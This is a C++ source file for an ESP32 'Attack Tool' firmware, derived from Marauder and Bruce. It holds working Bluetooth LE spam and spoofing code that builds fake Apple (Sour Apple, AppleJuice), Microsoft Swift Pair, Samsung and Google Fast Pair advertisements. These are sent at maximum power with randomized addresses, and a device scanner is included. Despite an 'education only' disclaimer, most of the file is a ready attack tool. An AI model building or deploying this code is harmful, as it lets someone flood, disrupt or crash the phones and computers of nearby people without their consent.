#include "bleheader.h"

/*
    * ble.cpp (Based ESP32 Marauder By @justcallmekoko, Bruce By @pr3y)
    * /!\ WARNING: All Code I Wrote In This Is For Education Purpose ONLY! /!\
    * /!\        I NOT RESPONSIBLE ANY DAMAGE USER CAUSE IN PUBLIC         /!\
    * Author: Shine Nagumo @Ohminecraft (Xun Anh Nguyen)
    * Licensed under the MIT License.
*/

BLEAdvertising *pAdvertising;
BLEServer *pServer;
BLEScan *pBLEScan;


LinkedList<BLEScanResult>* blescanres;
bool bleScanRedraw = false;

BLEAdvertisementData BLEModules::GetAdvertismentData(EBLEPayloadType type)
{
    BLEAdvertisementData AdvData = BLEAdvertisementData();

    uint8_t* AdvData_Raw = nullptr;
    uint8_t i = 0;
    //uint8_t dataSize = 0;

    switch (type)
    {
        //ESP32 Sour Apple by RapierXbox
        //Exploit by ECTO-1A
        case SourApple: {
            AdvData_Raw = new uint8_t[17];

            AdvData_Raw[i++] = 17 - 1;    // Packet Length
            AdvData_Raw[i++] = 0xFF;        // Packet Type (Manufacturer Specific)
            AdvData_Raw[i++] = 0x4C;        // Packet Company ID (Apple, Inc.)
            AdvData_Raw[i++] = 0x00;        // ...
            AdvData_Raw[i++] = 0x0F;  // Type
            AdvData_Raw[i++] = 0x05;                        // Length
            AdvData_Raw[i++] = 0xC1;                        // Action Flags
            const uint8_t types[] = { 0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0 };
            AdvData_Raw[i++] = types[rand() % sizeof(types)];  // Action Type
            esp_fill_random(&AdvData_Raw[i], 3); // Authentication Tag
            i += 3;   
            AdvData_Raw[i++] = 0x00;  // ???
            AdvData_Raw[i++] = 0x00;  // ???
            AdvData_Raw[i++] =  0x10;  // Type ???
            esp_fill_random(&AdvData_Raw[i], 3);

            AdvData.addData(std::string((char *)AdvData_Raw, 17));
            break;
        }

        case AppleJuice: {  // https://github.com/pr3y/Bruce/blob/main/src/modules/ble/ble_spam.cpp
            int randdevice = random(2);
            if (randdevice == 0) {
                uint8_t packet[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, IOS1[random() % sizeof(IOS1)],
                                      0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
                                      0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
                                      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
                AdvData.addData(std::string((char *)packet, 31));
            } else if (randdevice == 1) {
                uint8_t packet[23] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a,
                                      0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, IOS2[random() % sizeof(IOS2)],
                                      0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00,
                                      0x00, 0x00};
                AdvData.addData(std::string((char *)packet, 23));
            }
            break;
        }
        
        case Microsoft: {
            String Name = generateRandomName();

            uint8_t name_len = Name.length();

            //AdvData_Raw = new uint8_t[7 + name_len];

            //AdvData_Raw[i++] = 7 + name_len - 1;
            //AdvData_Raw[i++] = 0xFF;
            //AdvData_Raw[i++] = 0x06;
            //AdvData_Raw[i++] = 0x00;
            //AdvData_Raw[i++] = 0x03;
            //AdvData_Raw[i++] = 0x00;
            //AdvData_Raw[i++] = 0x80;
            //memcpy(&AdvData_Raw[i], Name.c_str(), name_len);
            //i += name_len;

            //AdvData.addData(std::string((char *)AdvData_Raw, 7 + name_len));

            uint8_t AdvData_Stack[64]; // Giả sử max length < 64
            if (7 + name_len > 64) {
                Serial.println("[ERROR] Microsoft name too long!");
                return AdvData;
            }
            AdvData_Stack[i++] = 7 + name_len - 1;
            AdvData_Stack[i++] = 0xFF;
            AdvData_Stack[i++] = 0x06;
            AdvData_Stack[i++] = 0x00;
            AdvData_Stack[i++] = 0x03;
            AdvData_Stack[i++] = 0x00;
            AdvData_Stack[i++] = 0x80;
            memcpy(&AdvData_Stack[i], Name.c_str(), name_len);
            i += name_len;

            AdvData.addData(std::string((char *)AdvData_Stack, 7 + name_len));
            break;
            break;
        }

        case Samsung: {
            AdvData_Raw = new uint8_t[15];

            uint8_t model = watch_models[rand() % 25].value;
            
            AdvData_Raw[i++] = 14; // Size
            AdvData_Raw[i++] = 0xFF; // AD Type (Manufacturer Specific)
            AdvData_Raw[i++] = 0x75; // Company ID (Samsung Electronics Co. Ltd.)
            AdvData_Raw[i++] = 0x00; // ...
            AdvData_Raw[i++] = 0x01;
            AdvData_Raw[i++] = 0x00;
            AdvData_Raw[i++] = 0x02;
            AdvData_Raw[i++] = 0x00;
            AdvData_Raw[i++] = 0x01;
            AdvData_Raw[i++] = 0x01;
            AdvData_Raw[i++] = 0xFF;
            AdvData_Raw[i++] = 0x00;
            AdvData_Raw[i++] = 0x00;
            AdvData_Raw[i++] = 0x43;
            AdvData_Raw[i++] = (model >> 0x00) & 0xFF; // Watch Model / Color (?)

            AdvData.addData(std::string((char *)AdvData_Raw, 15));
            break;
        }

        case Google: {
            const uint32_t model = android_models[rand() % android_models_count].value; // Action Type
            AdvData_Raw = new uint8_t[14];
            AdvData_Raw[i++] = 3;
            AdvData_Raw[i++] = 0x03;
            AdvData_Raw[i++] = 0x2C; // Fast Pair ID
            AdvData_Raw[i++] = 0xFE;

            AdvData_Raw[i++] = 6;
            AdvData_Raw[i++] = 0x16;
            AdvData_Raw[i++] = 0x2C; // Fast Pair ID
            AdvData_Raw[i++] = 0xFE;
            AdvData_Raw[i++] = (uint8_t)((model >> 0x10) & 0xFF); // Smart Controller Model ID
            AdvData_Raw[i++] = (uint8_t)((model >> 0x08) & 0xFF);
            AdvData_Raw[i++] = (uint8_t)((model >> 0x00) & 0xFF);

            AdvData_Raw[i++] = 2;
            AdvData_Raw[i++] = 0x0A;
            AdvData_Raw[i++] = (rand() % 120) - 100; // -100 to +20 dBm

            AdvData.addData(std::string((char *)AdvData_Raw, 14));
            break;
        }
        default: {
            Serial.println("[WARN] Choose Company Type!");
            return AdvData; // Return empty data for default case
        }
    }

    // Clean up allocated memory
    delete[] AdvData_Raw;


    return AdvData;
    //// https://github.com/Spooks4576
}

void BLEModules::main()
{
    blescanres = new LinkedList<BLEScanResult>();
      
    // Initialize BLE
    #ifdef USE_NIMBLE
    BLEDevice::setScanFilterMode(CONFIG_BTDM_SCAN_DUPL_TYPE_DEVICE);
    BLEDevice::setScanDuplicateCacheSize(200);
    #endif
    BLEDevice::init("");
    pBLEScan = BLEDevice::getScan();
    ble_initialized = true;
    Serial.println("[INFO] Successfully Initialized BLE Module");

    this->ShutdownBLE();
}

bool BLEModules::ShutdownBLE()
{
    if(ble_initialized) {
        #ifdef USE_NIMBLE
        if (pAdvertising->isAdvertising()) // This stupid things is cause continuous crash
            pAdvertising->stop();
        if (pBLEScan->isScanning()) {
            pBLEScan->stop();
            pBLEScan->clearResults();
        }
        #else
            pAdvertising->stop();
            pBLEScan->stop();
            pBLEScan->clearResults();
        #endif
        // Deinitialize BLE
        vTaskDelay(10 / portTICK_PERIOD_MS); // need delay to prevent crash
        BLEDevice::deinit();
        ble_initialized = false;
        Serial.println("[INFO] Shutting down BLE Module Successfully");
        return true;
    }
    return false;
}

BLEAdvertisementData BLEModules::selectSpooferDevices(uint8_t device_type, uint8_t device_brand, uint8_t adv_type) {
    BLEAdvertisementData AdvData = BLEAdvertisementData();
    if (device_brand == BLE_SPOOFER_DEVICE_BRAND_APPLE) {
        Serial.println("[INFO] BLE Apple Spoofer Starting");
        uint8_t packet[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, IOS1[(int)device_type],
                              0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
                              0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
                              0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
        AdvData.addData(std::string((char *)packet, 31));
    } else if (device_brand == BLE_SPOOFER_DEVICE_BRAND_SAMSUNG) {
        Serial.println("[INFO] BLE Samsung Spoofer Starting");
        uint8_t model = watch_models[(int)device_type].value;
        uint8_t AdvData_Raw[15] = {0x0E, 0xFF, 0x75, 0x00, 0x01, 0x00, 0x02, 
                                   0x00, 0x01, 0x01, 0xFF, 0x00, 0x00, 0x43,
                                   (uint8_t)((model >> 0x00) & 0xFF)};
        AdvData.addData(std::string((char *)AdvData_Raw, 15));
    } else if (device_brand == BLE_SPOOFER_DEVICE_BRAND_GOOGLE) {
        Serial.println("[INFO] BLE Google Spoofer Starting");
        uint32_t model = android_models[(int)device_type].value; // Action Type
        uint8_t AdvData_Raw[14] = {0x03, 0x03, 0x2C, 0xFE, // First 3 data to announce Fast Pair
                                   0x06, 0x16, 0x2C, 0xFE,
                                   (uint8_t)((model >> 0x10) & 0xFF),
                                   (uint8_t)((model >> 0x08) & 0xFF),
                                   (uint8_t)((model >> 0x00) & 0xFF), // 6 more data to inform FastPair and device data
                                   0x02, 0x0A,
                                   (uint8_t)((rand() % 120) - 100)}; // 2 more data to inform RSSI data.
        AdvData.addData(std::string((char *)AdvData_Raw, 14));
    }

    Serial.println("[INFO] BLE Spoofer Device Index: " + (String)device_type);
    String adv_type_str = "";
    
    switch(adv_type) {
        #ifndef USE_NIMBLE
        case ADV_MODE_NON:
            pAdvertising->setAdvertisementType(ADV_TYPE_NONCONN_IND);
            adv_type_str = "NONN";
            break;
        case ADV_MODE_IND:
            pAdvertising->setAdvertisementType(ADV_TYPE_IND);
            adv_type_str = "IND";
            break;
        case ADV_MODE_SCAN:
            pAdvertising->setAdvertisementType(ADV_TYPE_SCAN_IND);
            adv_type_str = "SCAN";
            break;
        #else
        case ADV_MODE_NON:
            pAdvertising->setAdvertisementType(BLE_GAP_CONN_MODE_NON);
            adv_type_str = "NONN";
            break;
        case ADV_MODE_DIR:
            pAdvertising->setAdvertisementType(BLE_GAP_CONN_MODE_DIR);
            adv_type_str = "DIR";
            break;
        case ADV_MODE_UND:
            pAdvertising->setAdvertisementType(BLE_GAP_CONN_MODE_UND);
            adv_type_str = "UND";
            break;
        #endif
    }

    Serial.println("[INFO] BLE Spoofer Ad Type: " + adv_type_str);

    return AdvData;
}

void BLEModules::initSpoofer() {
    if (ble_initialized) {
        Serial.println("[INFO] BLE already initialized, skipping...");
        return;
    }
    //uint8_t macAddr[6];
    //generateRandomMac(macAddr);
    //esp_base_mac_addr_set(macAddr);
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER);
    #ifndef USE_NIMBLE
    BLEDevice::init("ESP32 Attack Tool"); 
    BLEServer *pServer = BLEDevice::createServer();
    pAdvertising = pServer->getAdvertising();
    ble_initialized = true;
    #endif
    esp_bd_addr_t null_addr = {0xFE, 0xED, 0xC0, 0xFF, 0xEE, 0x69};
    #ifndef USE_NIMBLE
    pAdvertising->setDeviceAddress(null_addr, BLE_ADDR_TYPE_RANDOM);
    #else
    esp_ble_gap_set_rand_addr(null_addr);
    #endif

    Serial.println("[INFO] BLE Spoofer Initialized Successfully!");
}

void BLEModules::startSpoofer(uint8_t device_type, uint8_t device_brand, uint8_t adv_type) {
    esp_bd_addr_t dummy_addr = {0x00};
      for (int i = 0; i < 6; i++) {
        dummy_addr[i] = random(256);
        if (i == 0) dummy_addr[i] |= 0xC0; // Random non-resolvable
    }
    #ifdef USE_NIMBLE
    if (!ble_initialized) {
        uint8_t macAddr[6];
        generateRandomMac(macAddr);
        esp_base_mac_addr_set(macAddr);
        esp_ble_gap_set_rand_addr(dummy_addr);
        BLEDevice::init("ESP32 Attack Tool");
        BLEServer *pServer = BLEDevice::createServer();
        pAdvertising = pServer->getAdvertising();
        ble_initialized = true;
    }
    #else
    pAdvertising->setDeviceAddress(dummy_addr, BLE_ADDR_TYPE_RANDOM);
    #endif
    BLEAdvertisementData oAdvertisementData = selectSpooferDevices(device_type, device_brand, adv_type);
    pAdvertising->addServiceUUID(SERVICE_UUID);
    pAdvertising->setAdvertisementData(oAdvertisementData);
    pAdvertising->setMinInterval(0x20); // 32.5ms
    pAdvertising->setMaxInterval(0x20);
    pAdvertising->setMinPreferred(0x20);
    pAdvertising->setMaxPreferred(0x20);
    pAdvertising->start();
    Serial.println("[INFO] Starting Spoofer Advertisement");
}

void BLEModules::stopSpoofer() {
    #ifdef USE_NIMBLE
    if (ble_initialized && pAdvertising->isAdvertising()) {
        vTaskDelay(50 / portTICK_PERIOD_MS); // Wait for advertisement to stop
        pAdvertising->stop();
        vTaskDelay(10 / portTICK_PERIOD_MS); // Wait for stop to complete
        BLEDevice::deinit();
        ble_initialized = false;
    }
    #else
    pAdvertising->stop();
    #endif
    Serial.println("[INFO] Stopping Spoofer Advertisement");
}

void BLEModules::initSpam() {
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, MAX_TX_POWER); 
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER); 
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_SCAN , MAX_TX_POWER);

    esp_bd_addr_t null_addr = {0xFE, 0xED, 0xC0, 0xFF, 0xEE, 0x69};
    #ifdef USE_NIMBLE
    esp_ble_gap_set_rand_addr(null_addr);
    #endif

    ble_initialized = true;
    Serial.println("[INFO] BLE Spam Initialized Successfully!");
}

/*
void BLEModules::executeAppleSpam(EBLEPayloadType apple_mode)
{
    uint8_t macAddr[6];
    generateRandomMac(macAddr);
    esp_base_mac_addr_set(macAddr);
    BLEDevice::init("");
    BLEServer *pServer = BLEDevice::createServer();
    pAdvertising = pServer->getAdvertising();
    vTaskDelay(40 / portTICK_PERIOD_MS);
    BLEAdvertisementData advertisementData;
    if (apple_mode == AppleJuice) advertisementData = this->GetAdvertismentData(AppleJuice);
    else advertisementData = this->GetAdvertismentData(SourApple);
    //pAdvertising->addServiceUUID(SERVICE_UUID);
    pAdvertising->setAdvertisementData(advertisementData);
    pAdvertising->start();
    vTaskDelay(20 / portTICK_PERIOD_MS);
    pAdvertising->stop();
    BLEDevice::deinit();
}
*/

void BLEModules::executeSwiftpair(EBLEPayloadType type)
{
    uint8_t macAddr[6];
    generateRandomMac(macAddr);
    esp_base_mac_addr_set(macAddr);
    #ifndef USE_NIMBLE
    esp_bd_addr_t dummy_addr = {0x00};
      for (int i = 0; i < 6; i++) {
        dummy_addr[i] = random(256);
        if (i == 0) dummy_addr[i] |= 0xC0; // Random non-resolvable
    }
    #endif
    BLEDevice::init("");
    BLEServer *pServer = BLEDevice::createServer();
    pAdvertising = pServer->getAdvertising();
    vTaskDelay(40 / portTICK_PERIOD_MS);
    BLEAdvertisementData advertisementData = GetAdvertismentData(type);
    pAdvertising->setAdvertisementData(advertisementData);
    #ifndef USE_NIMBLE
    pAdvertising->setDeviceAddress(dummy_addr, BLE_ADDR_TYPE_RANDOM);
    #endif
    pAdvertising->start();
    vTaskDelay(20 / portTICK_PERIOD_MS);
    pAdvertising->stop();
    BLEDevice::deinit();
}

class BLEScanDeviceCallbacks: public BLEAdvertisedDeviceCallbacks {
    #ifdef USE_NIMBLE
    void onResult(BLEAdvertisedDevice *advertisedDevice) {
        bleScanRedraw = true;
        BLEScanResult bleres;
        String ble_name;
        ble_name = advertisedDevice->getName().c_str();
        if (ble_name.isEmpty()) bleres.name = "<no name>";
        else bleres.name = ble_name;
        bleres.rssi = advertisedDevice->getRSSI();
        bleres.addr = advertisedDevice->getAddress();
        blescanres->add(bleres);
        String add_to_buffer;
        if (ble_name.isEmpty()) add_to_buffer = String(bleres.addr.toString().c_str());
        else add_to_buffer = ble_name;
        //if (display_buffer->size() > 4)
        //    display_buffer->shift();
        display_buffer->add(add_to_buffer);
        Serial.println("[INFO] Added: " + bleres.name + " (Addr: " + String(bleres.addr.toString().c_str()) + ")" + " (RSSI: " + String(bleres.rssi) + ")");
    }
    #else
    void onResult(BLEAdvertisedDevice advertisedDevice) override {
        bleScanRedraw = true;
        BLEScanResult bleres;
        String ble_name;
        ble_name = advertisedDevice.getName().c_str();
        if (ble_name.isEmpty()) bleres.name = "<no name>";
        else bleres.name = ble_name;
        bleres.rssi = advertisedDevice.getRSSI();
        bleres.addr = advertisedDevice.getAddress().toString().c_str();
        blescanres->add(bleres);
        String add_to_buffer;
        if (ble_name.isEmpty()) add_to_buffer = bleres.addr;
        else add_to_buffer = ble_name;
        display_buffer->add(add_to_buffer);
        Serial.println("[INFO] Added: " + bleres.name + " (Addr: " + bleres.addr + ")" + " (RSSI: " + String(bleres.rssi) + ")");
    }
    #endif
};

void BLEModules::scanCompleteCB(BLEScanResults scanResults) {
    printf("[INFO] Scan complete!\n");
    scanResults.dump();
  } // scanCompleteCB

void BLEModules::bleScan() {
    delete blescanres;
    blescanres = new LinkedList<BLEScanResult>();
    BLEDevice::init("ESP32 Attack Tool - BLE Utility");
    ble_initialized = true;
    pBLEScan = BLEDevice::getScan();
    pBLEScan->setAdvertisedDeviceCallbacks(new BLEScanDeviceCallbacks(), false);
    pBLEScan->setActiveScan(true);
    pBLEScan->setInterval(100);
    pBLEScan->setWindow(99);
    #ifdef USE_NIMBLE
    pBLEScan->setMaxResults(0);
    #endif

    vTaskDelay(100 / portTICK_PERIOD_MS);
    //delay(100);

    Serial.println("[INFO] Starting BLE Scan");
    pBLEScan->start(0, scanCompleteCB, false);
    
    //Serial.println("[INFO] BLE Scan Done! Found: " + String(foundDevices.getCount()) + " Devices!");

    //this->ShutdownBLE();

    //Serial.println("[INFO] BLE Scan completed successfully! Devices in list: " + String(blescanres->size()));
}

